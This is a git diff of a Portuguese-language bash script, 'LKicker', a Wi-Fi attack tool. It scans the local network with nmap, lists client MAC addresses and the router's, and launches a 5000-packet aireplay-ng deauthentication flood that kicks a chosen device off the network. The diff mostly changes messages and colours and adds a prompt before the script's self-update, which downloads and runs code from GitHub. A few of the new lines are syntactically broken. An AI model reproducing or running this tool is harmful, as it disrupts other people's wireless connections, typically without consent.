@@ -1,25 +1,12 @@
 #!/bin/bash
 # =============[ VARIAVEIS ]=============
 	version=3.0.1
-	last_date=01/07/19
-	
+	last_date="01/07/19"
 	color_red="\033[01;31m"
 	color_green="\033[01;32m"
 	color_yellow="\033[01;33m"
 	color_white="\033[01;37m"
-	
-	macs=("1" "0")
 	card_name="wlan0"
-	mac="null"
-	router_mac="" 
-	address_now="null"
-	description="null"
-	addres_description=("Desconhecido","Desconhecido")
-	RES_ADDRES=("-","-")
-	ip_to="192.168.0.1"
-
-	x=0;
-	failx=0
 # =============[ VARIAVEIS ]============= 
 function print_logo(){
         echo -e "\033[01;32m"       
@@ -48,22 +35,40 @@ function new_logo(){
 	print_logo
 }
 function check_version(){
-	rm version > dumps.txt
-	wget https://raw.githubusercontent.com/DevPGT/LKicker/master/version > dumps.txt
-	version_now=$(cat version)
-	if [ $version -lt $version_now ]
+	if [ -e "version" ] ; then rm version > dumps.txt; fi
+	wget -q -t 5 https://raw.githubusercontent.com/DevPGT/LKicker/master/version
+	network=0
+	if [ -e "version" ] ; then
+		network=1;
+	else
+		echo -e "$color_red [!!] Erro ao verificar versionamento ! Voce está conectado a internet ?"
+		return
+	fi
+	version_now=$(cat version | grep "." | sed 's/ //g' | sed  "s/\.//g")
+	if [[ $(echo $version | sed 's/\.//g') != $version_now && $network == 1 ]]
 		then
 			new_logo
-			" $color_red [!!!] $color_yellow Está versão do script está desatualizada ! Atualizando para nova versão:$color_green { $version_now }"
-			echo -e "
-			ping -c 2 127.0.0.1 > dumps.txt
-			mv ./kicker ./kicker_old
-			wget https://raw.githubusercontent.com/DevPGT/LKicker/master/kicker
-			chmod +x ./kicker
-			./kicker
-			" > updater.sh
-			chmod +x ./updater.sh
-			gnome-terminal -- "./updater.sh" > dumps.txt
+			echo -e " $color_red [!!!] $color_yellow Está versão do script está desatualizada ! { $version } Atualize para nova versão:$color_green { $version_now }"
+			echo " [!] Proseguir com instalação automatica ?"
+			read resposta
+			resposta={$resposta,,}
+			if [ $resposta == "s" ]
+				then
+					if [ -e "updater" ] ; then rm updater > dumps.txt; fi
+					echo -e "
+					ping -c 2 127.0.0.1 > dumps.txt
+					mv ./kicker ./kicker_old
+					wget https://raw.githubusercontent.com/DevPGT/LKicker/master/kicker
+					chmod +x ./kicker
+					./kicker
+					" > updater
+					chmod +x ./updater
+					gnome-terminal -- "./updater" > dumps.txt
+					stop
+			fi
+
+		else
+			if [ network == 1 ] ; then echo -e " $color_green[!!] $color_white Script na ultima versão!$color_green { $version }"; fi
 	fi
 }
 function recheck_dependencies(){
@@ -113,6 +118,7 @@ function check_dependencies(){
 function get_routermac(){
 	echo -e "$color_yellow [...] Obtendo mac do roteador"
 	router_mac=$(iwconfig $card_name| grep Access | sed -e 's/Mode.*nt://g' | grep : | sed -e 's/ //g')
+	echo -e "$color_green [!] GATEWAY MAC:$color_white { $router_mac }"
 }
 function load_clients(){
 	echo -e "$color_yellow [...] Pesquisando clientes na rede $lip"
@@ -123,10 +129,12 @@ function load_clients(){
 	cut -c14-30 clients.txt > readmacs.txt
 }
 function frequency_checker(){
-	echo -e "$color_yellow [...] Chechando Frequencia da conexão"
+	echo -e "$color_yellow [...] Checando Frequencia da conexão"
 	if [ $(iwconfig $card_name | grep "Frequency" | sed 's/Mode:.*y://g' | sed 's/ //g' | cut -c1) == "5" ]
 		then
 			echo -e "$color_red [!] ALERTA: FREQUENCIAS MAIORES QUE 2.5GHz PODEM NÃO FUNCIONAR CORRETAMENTE!"
+	else
+		echo -e "$color_green [!] Frequencia detectada: $(iwconfig $card_name | grep "Frequency" | sed 's/Mode:.*y://g' | sed 's/ //g' | cut -c1-8)"
 	fi
 }
 function know_interfaces(){
@@ -143,6 +151,10 @@ function know_interfaces(){
 	frequency_checker
 }
 function show_macs(){
+	macs=("1" "0")
+	addres_description=("Desconhecido","Desconhecido")
+	RES_ADDRES=("-","-")
+	failx=0
 	x=0
 	addr_count=0
 	desc_count=0
@@ -156,7 +168,6 @@ function show_macs(){
 		addres_description[desc_count]="$line"
 		let "desc_count = desc_count +1"
 	done
-	setterm -foreground white
 	echo -e "$color_green [!]$color_yellow Nome da placa: $color_white $card_name $color_yellow, Frequencia:$color_green $(iwconfig $card_name | grep "Frequency" | sed 's/Mode:.*y://g' | sed 's/ //g' | cut -c1-8)$color_yellow Endereço MAC:$color_white $router_mac"
 	for line in $(cat readmacs.txt) 
 	do 
@@ -185,7 +196,7 @@ function show_macs(){
 		
 			
 	else
-		echo -e "$color_green [!] -> Clientes carregados com sucesso!"
+		echo -e "$color_green\n [!] -> Clientes carregados com sucesso!"
 	fi
 }
 function get_nmap(){
@@ -209,28 +220,29 @@ function stop(){
 	airmon-ng stop "$card_name"mon > dumps.txt
 	clear
 	print_logo
-	setterm -foreground red
-	echo " Obrigado por usar ! espero que tenha gostado se voce experienciou qualquer tipo de problema, porfavor reporte em https://github.com/DevPGT/lkicker"
-	echo " Desenvolvido por: Gabriel TX (DevPG)"
-	echo " Instagram: pgdogas"
-	echo " Versão: $version"
+	echo -e "$color_red [!] $color_white Obrigado por usar ! espero que tenha gostado !
+  se voce experienciou qualquer tipo de problema, porfavor reporte em https://github.com/DevPGT/lkicker"
+	echo -e "$color_yellow [!] Desenvolvido por:$color_white Gabriel TX (DevPG)"
+	echo -e "$color_green [!] Instagram:$color_white pgdogas"
+	echo -e "$color_white [!] Versão:$color_green $version"
 	ping 127.0.0.1 -c 5 > dumps.txt
 	clear	
-	rm readmacs.txt interfaces.txt up_interfaces.txt clients_ips.txt scan_out.txt clients.txt core-depends.logs execute.sh > dumps.txt
+	rm readmacs.txt interfaces.txt up_interfaces.txt clients_ips.txt scan_out.txt clients.txt core-depends.logs > dumps.txt
+	if [ -e "execute.sh" ] ; then rm execute.sh > dumps.txt; fi
 	rm dumps.txt
 	exit
 }
 iwconfig | grep "ESSID" | sed 's/IE.*"//g' | sed 's/ //g' | cut -c1-5 > interfaces.txt
 new_logo
 setterm -foreground red
-echo "  [!]  Este script foi criado e testado em sistema baseado em debian, não há testes realizados em outros sistemas !"
-echo "  [!]  Para desativar uma interface momentaneamente execute: ifconfig wlanX down"
-echo "  [!]  Dependencias: nmap, aircrack-ng."
-echo "  [!]  Ainda não há testes de compatibilidade com placas de 5GHz!"
+echo -e "  [!]   Este script foi criado e testado em sistema baseado em$color_white Debian${color_red}, não há testes realizados em outros sistemas !"
+echo -e "  [!]   Dependencias:$color_white nmap, aircrack-ng."
+echo -e "$color_red  [!!]  Ainda não há testes de compatibilidade com placas de$color_yellow 5GHz!"
+echo -e "$color_yellow  [...] $color_white Verificando se há atualizações para o script"
+check_version
 echo -e "\n\n"
 check_dependencies
 echo -e "\033[01;33m [?] -> Qual placa wireless usar ?(default: wlan0 / wlan0mon)"
-setterm -foreground white
 read card
 if [ $card != "" ]
 	then
@@ -245,14 +257,9 @@ if [ $card != "" ]
 		echo -e "\033[01;33m [!] -> O nome da placa sera utilizado como: $card_name / ${card_name}mon" 
 fi
 know_interfaces
-echo -e "$color_yellow [...] -> Obtendo gateway padrão..."
-setterm -foreground green
-echo -e "$color_green [!] -> Gateway obtido!"
-setterm -foreground white
 echo -e "$color_yellow [...] -> Analisando REDE Aguarde!"
 lip=$(ifconfig $card_name | grep "inet 192" | sed 's/inet.*broadcast/->/' | sed -e 's/ //g' | cut -c3-12 | sed 's/$/0-24/' | sed -r -e 's/[-]+/\//g') 
 load_clients
-setterm -foreground yellow
 echo -e "$color_yellow [...] -> Inicializando Kicker..."
 ping 127.0.0.1 -c 4 > dumps.txt 
 get_routermac
@@ -272,7 +279,10 @@ $color_green   0~$y)$color_white Expulsar cliente escolhido"
 	read ddos
 	if [ $ddos == 96 ]
 		then
+			airmon-ng stop ${card_name}mon
 			new_logo
+			echo -e "$color_yellow [...] Aguarde ajustando parametros e executando funções!"
+			ping -c 8 127.0.0.1 > dumps.txt
 			get_routermac
 			ping -c 2 127.0.0.1 > dumps.txt
 			load_clients
@@ -318,7 +328,6 @@ $color_green   0~$y)$color_white Expulsar cliente escolhido"
 					get_routermac
 			fi
 			new_logo
-			setterm -foreground white
 			echo -e "$color_green [!] -> Executando$color_red ataque$color_green contra ID:$color_red $ddos $color_yellow-> ( $mac )"
 			echo -e "$color_green [!] -> GATEWAY_MAC :$color_white $router_mac"
 			airmon-ng start $card_name > dumps.txt
@@ -332,10 +341,10 @@ $color_green   0~$y)$color_white Expulsar cliente escolhido"
 			echo -e "echo -e '\033[01;31m'\naireplay-ng -0 5000 -a $router_mac -c $mac "$card_name"mon" >> execute.sh
 			chmod +x execute.sh > dumps.txt
 			gnome-terminal -- "./execute.sh" > dumps.txt
-			setterm -foreground white
 			show_macs
 			ask
 		fi
 	fi
 }
 ask
+
